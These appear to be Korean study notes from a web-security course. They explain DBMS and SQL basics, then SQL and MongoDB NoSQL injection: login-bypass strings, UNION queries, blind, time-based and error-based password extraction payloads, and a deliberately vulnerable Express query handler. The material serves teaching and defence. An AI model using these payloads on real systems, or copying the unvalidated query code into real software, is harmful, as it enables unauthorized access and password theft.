## DBMS

데이터베이스 관리 시스템
데이터베이스에 정보를 기록, 수정, 삭제하는 기능을 수행함
다수의 사람들이 동시에 데이터베이스에 접근할 수 있도록 지원해주는 말그대로 매니저

관계형 : MySQL, MariaDB, PostgreSQL, SQLite
비관계형 : MongoDB, CouchDB, Redis

## SQL

Structed Query Language
RDBMS의 데이터를 정의, 질의, 수정 등 하기 위한 언어

DDL(Define) : 데이터 정의, 스키마(Table) 및 DB의 생성, 수정, 삭제
DML(Manipulate) : 데이터 조작, 테이블 내 데이터에 대한 생성, 수정, 삭제, 조회
DCL(Control) : 접근 권한 설정(Grant, Revoke)

### DDL

```sql
CREATE DATABASE Dreamhack;

USE Dreamhack;
CREATE TABLE Board(
	idx INT AUTO_INCREMENT,
	boardTitle VARCHAR(100) NOT NULL,
	boardContent VARCHAR(2000) NOT NULL,
	PRIMARY KEY(idx)
);
```

### DML

```sql
INSERT INTO 
  Board(boardTitle, boardContent, createdDate) 
Values(
  'Hello', 
  'World !',
  Now()
);

SELECT 
  boardTitle, boardContent
FROM
  Board
Where
  idx=1;

UPDATE Board SET boardContent='DreamHack!' 
  Where idx=1;
```

## SQL Injection

쿼리를 임의로 조작해서 데이터베이스의 정보를 획득

### 가장 간단한 SQL Injection 기법들

```sql
select * from user_table where uid='admin' or '1' and upw='';
select * from user_table where uid='admin'-- '' and upw=''; // --, #, /**/
select uid from user_table where uid='admin' union select upw from user_table where uid='admin'
```

## Blind SQL Injection

True, False 응답을 통해 정답을 알아가는 방식
쿼리에 대한 결과를 화면에서 직접 확인할 수 없을 때 사용

```dart
ascii('a') => 97
substr('ABCD', 1, 1) = 'A'
substr('ABCD', 2, 2) = 'BC'
```

```sql
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=114-- ' and upw=''; # False (첫번째 글자가 r인지)
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,1,1))=115-- ' and upw=''; # True (첫번째 글자가 s인지)

SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=115-- ' and upw=''; # False (두번째 글자가 s인지)
SELECT * FROM user_table WHERE uid='admin' and ascii(substr(upw,2,1))=116-- ' and upw=''; # True  (두번째 글자가 t인자)
```

Blind SQL Injection은 여러번 시도해야 하기 때문에 스크립트로 작성

## NoSQL

비관계형 데이터베이스(키-값 쌍으로 데이터를 저장)
DBMS 종류에 따라 다양한 구조, 문법이 있음

### MongoDB

Collection 정의 필요 없음 => 테이블과 동일한 개념
JSON 형식으로 쿼리를 작성
_id 필드가 Primary Key 역할을 수행

```sql
SELECT * FROM inventory WHERE status = "A" and qty < 30;
db.inventory.find( { $and: [ { status: "A" }, { qty: { $lt: 30 } } ] } )
```

```bash
$ mongo
> db.user.insert({uid: 'admin', upw: 'secretpassword'})
WriteResult({ "nInserted" : 1 })
> db.user.find({uid: 'admin'})
{ "_id" : ObjectId("5e71d395b050a2511caa827d"), "uid" : "admin", "upw" : "secretpassword" }
```

연산자 목록

```PHP
$eq : equal
$in : 배열 안의 값들과 일치하는 것
$ne : not equal
$nin : not in

$and : and
$not : not

$exists : 특정 필드가 있는 문서 찾기
$type : 특정 필드가 특정 유형인 문서 찾기

$expr : 집계식 사용
$regex : 정규식과 일치하는 문서
$text : 텍스트 검색
```

SQL/MongoDB 비교

```
SELECT * FROM account;
db.account.find()

SELECT * FROM account WEHRE user_id="admin";
db.account.find(
{user_id: "admin"}
)

SELECT user_idx FROM account WHERE user_id="admin";
db.account.find(
{ user_id: "admin" },
{ user_idx:1, _id:0 }
)

INSERT INTO account(user_id, user_pw,) VALUES ("guest","guest");
db.account.insert({
user_id: "guest",
user_pw: "guest"
})

DELETE FROM account;
db.account.remove()

DELETE FROM account WHERE user_id="guest";
db.account.remove( {user_id: "guest"} )

UPDATE account SET user_id="guest2" WHERE user_idx=2;
db.account.update(
{user_idx: 2},
{ $set: { user_id: "guest2" } }
)
```

### Redis

Redis는 메모리 기반의 DBMS
주로 캐싱 용도로 사용

### CouchDB

MongoDB와 유사
웹 기반 DBMS로 데이터 요청도 웹 기반으로 동작

## NoSQL Injection

### MongoDB 기반 NoSQL Injection - 컨셉

결국엔 입력값에 대한 검증을 제대로 하지 않아 발생
오브젝트를 입력할 수 있다면 공격 코드 삽입 가능

```js
const express = require('express');
const app = express();
app.get('/', function(req,res) {
    console.log('data:', req.query.data); // 
    console.log('type:', typeof req.query.data); // type이 string으로 고정되어있지 않아 다른 타입의 데이터도 입력 가능

    res.send('hello world');
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

### NoSQL Injection 예제

```js
const express = require('express');
const app = express();
const mongoose = require('mongoose');
const db = mongoose.connection;
mongoose.connect('mongodb://localhost:27017/', { useNewUrlParser: true, useUnifiedTopology: true });
app.get('/query', function(req,res) {
    db.collection('user').find({
        'uid': req.query.uid,
        'upw': req.query.upw
    }).toArray(function(err, result) {
        if (err) throw err;
        res.send(result);
  });
});
const server = app.listen(3000, function(){
    console.log('app.listen');
});
```

아무 타입의 데이터를 req 인자로 넣을 수 있으므로,
오브젝트 타입 + 연산자 사용 가능
$ne를 활용해서 a가 아닌 데이터를 조회할 수 있음

GET 버전

```bash
http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]
```

POST 버전

```json
{"uid": "admin", "upw": {"$ne":""}}
```

### Blind NoSQL Injection

$regex, $where 연산자 활용해서 Blind Injection 가능

#### 1. 각 문자로 시작하는 데이터 조회

```bash
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})
...
> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

#### 2. where로 조회

```bash
> db.user.find({$where:"return 1==1"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
> db.user.find({uid:{$where:"return 1==1"}})
error: {
	"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
	"code" : 17287
}
```

#### 3. where + substring

```bash
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
...
> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```

#### 4. sleep 함수를 활용한 Time based Injection

지연 시간을 통해 참/거짓 결과를 확인
참이면 sleep 함수 실행하도록 코드를 작성해서 참/거짓 확인 가능

```bash
db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
/*
/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
...
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> 시간 지연 발생.
*/
```

#### 5. Error based Injection

참이면 올바르지 않은 문법을 삽입해서 에러 발생시켜서 참/거짓 확인 가능

```bash
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
	"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
	"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
```